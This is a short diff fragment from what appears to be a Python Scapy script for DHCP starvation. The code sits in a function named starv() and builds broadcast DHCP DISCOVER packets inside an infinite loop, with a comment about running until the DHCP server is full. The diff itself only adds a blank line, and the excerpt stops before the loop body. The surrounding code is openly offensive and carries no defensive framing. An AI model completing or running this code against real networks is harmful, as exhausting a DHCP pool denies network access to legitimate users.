@@ -42,6 +42,7 @@ def starv():
     target = "255.255.255.255"
     if(args.target):
         target = args.target
+        
     dhcp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst=target)/UDP(sport=68,dport=67)/BOOTP(op=1)/DHCP(options=[('message-type','discover'),('end')])
     while True: #meybe do change the while loop till we get the dhcp server full 
         #send to other function with other proceses
